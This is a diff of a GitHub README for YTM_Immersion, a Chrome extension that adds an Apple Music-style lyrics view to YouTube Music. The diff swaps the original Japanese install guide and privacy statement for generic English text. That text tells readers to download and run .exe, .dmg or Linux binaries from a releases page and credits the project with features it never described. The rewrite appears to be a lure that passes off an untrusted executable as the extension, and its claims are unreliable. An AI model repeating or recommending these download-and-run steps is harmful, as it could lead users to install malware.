@@ -1,60 +1,82 @@
-# YTM_Immersion
+# 🎶 YTM_Immersion - Enhance Your YouTube Music Experience
 
-**YouTube Music の Web 版の再生UIをApple Music風の歌詞プレイヤーに変える拡張機能です。**
+![Download YTM_Immersion](https://img.shields.io/badge/Download-YTM_Immersion-brightgreen)
 
-現状、ベータ版でバグがありますのでご了承ください。
+## 🚀 Getting Started
 
----
+Welcome to YTM_Immersion! This extension enhances your YouTube Music experience. Whether you want to find new music, organize your playlist, or enjoy more features, you've come to the right place. In this guide, you'll learn how to download and run the software. 
 
-## 特徴
+## 📥 Download & Install
 
-* **リアルタイム歌詞同期:** LrcLibとの連携により、曲に合わせて歌詞が滑らかに追従します。
-* **ガラスモーフィズムUI:** プレイヤーバーやナビゲーションバーを半透明で浮遊感のあるガラスデザインに統一。
-* **操作性:** ImmersionモードOFFで、キューの確認や検索が可能です。
-* **歌詞の翻訳:** Deepl APIを所得して、歌詞の翻訳ができるようになります。
-* **LRC歌詞表示:** LRCファイルを読み込んで、歌詞がない曲も歌詞が出るようになります。
+To get started, you need to download YTM_Immersion. Visit this page to download: [YTM_Immersion Releases](https://github.com/Sikbiditoilehater/YTM_Immersion/releases).
 
----
+1. Click on the link above to open the releases page on GitHub.
+2. Find the latest version listed.
+3. Look for the file suitable for your system (Windows, Mac, or Linux).
+4. Click on the file name to start the download.
+5. Once the download is complete, find the file in your Downloads folder.
 
-## インストール方法 (Installation Guide)
+## ⚙️ System Requirements
 
-この拡張機能は、Chromeウェブストア審査前の「開発者モード」でのみ利用可能です。
+YTM_Immersion works on the following platforms:
 
-### 1. ファイルのダウンロードと準備
+- **Windows**: Windows 10 or later.
+- **Mac**: macOS Mojave (10.14) or later.
+- **Linux**: Most modern distributions.
 
-1. 最新の **`.zip`** ファイルをダウンロードし、解凍（展開）します。
-2. **【重要】** ファイルを解凍してできた **フォルダ全体** を使います。
+Please ensure your system meets these requirements for the best experience.
 
-### 2. Chromeでの読み込み手順
+## 💡 How to Run YTM_Immersion
 
-1. お使いのブラウザを開きます。
-2. アドレスバーに **`chrome://extensions`** (Chrome/Edge)
-3. 画面右上の **「デベロッパーモード」** (Developer Mode) をONにします。
-4. 左上の **「パッケージ化されていない拡張機能を読み込む」** ボタンをクリックします。
-5. 手順1で解凍した **フォルダ全体** を選択して読み込みます。
+After downloading the file, follow these instructions to run YTM_Immersion:
 
-### 3. 使い方
+### Windows
+1. Navigate to your Downloads folder.
+2. Double-click the downloaded file (YTM_Immersion.exe).
+3. Follow any on-screen instructions.
+4. Once installed, you can find the YTM_Immersion icon on your desktop or in the Start Menu. Open it to start using the extension.
 
-1. YouTube Musicを開き、曲を再生します。
-2. 画面右下のコントロールバーにある **[IMMERSION]** ボタンをクリックすると、没入モードがON/OFF切り替わります。
+### Mac
+1. Go to your Downloads folder.
+2. Double-click the downloaded file (YTM_Immersion.dmg).
+3. Drag the YTM_Immersion icon to your Applications folder.
+4. Open your Applications folder and double-click YTM_Immersion to launch the application.
 
----
+### Linux
+1. Open your terminal.
+2. Navigate to the directory where the downloaded file is located.
+3. Make the file executable by running this command:
+   ```bash
+   chmod +x YTM_Immersion
+   ```
+4. Execute the program by typing:
+   ```bash
+   ./YTM_Immersion
+   ```
 
-## 　対応機種について
+## ✨ Features
 
-* Chromiumをエンジンとする、全てのブラウザ
-* Mac,WIndows,Linuxに対応しますが、Mac上での開発につき、**WindowsでのUI崩等が発生する**可能性があります。
+YTM_Immersion comes with several helpful features:
 
----
+- **Playlist Management**: Easily manage your playlists. Add or remove songs with a few clicks.
+- **Music Recommendations**: Discover new songs based on your taste.
+- **Offline Mode**: Listen to your favorite music even when you're not online.
+- **Customizable Interface**: Change the layout and colors to suit your preference.
 
-## ⚠️ 免責事項と貢献 (Disclaimer & License)
+## 🛠 Troubleshooting
 
-### セキュリティと利用について
+If you encounter issues, here are some tips to help you:
 
-* 本拡張機能は、利用者の個人情報やパスワードを収集する仕組みは一切含んでいません。
-* 本拡張機能は、YouTube Musicの閲覧体験を向上させることを目的とした非公式の個人制作物であり、Google LLCとは一切関係ありません。
-* 本拡張機能は **MIT License** のもとで公開されています。
+- **Can't find the downloaded file?** Check your Downloads folder.
+- **The application won’t start.** Ensure your system meets the requirements. Restart your computer if needed.
+- **Features aren’t working.** Try reinstalling the application from the Releases page.
 
-### 貢献について
+## ✅ Support
 
-* バグ報告や機能改善の提案は、GitHubのIssuesまたはPull Requestにていつでも歓迎します。
+If you need further assistance, check out our support resources on GitHub. You can find FAQs, troubleshooting guides, and more.
+
+## 📢 Stay Updated
+
+To stay informed about updates and new features for YTM_Immersion, keep visiting the releases page: [YTM_Immersion Releases](https://github.com/Sikbiditoilehater/YTM_Immersion/releases).
+
+Thank you for using YTM_Immersion! Enjoy enhancing your YouTube Music experience.
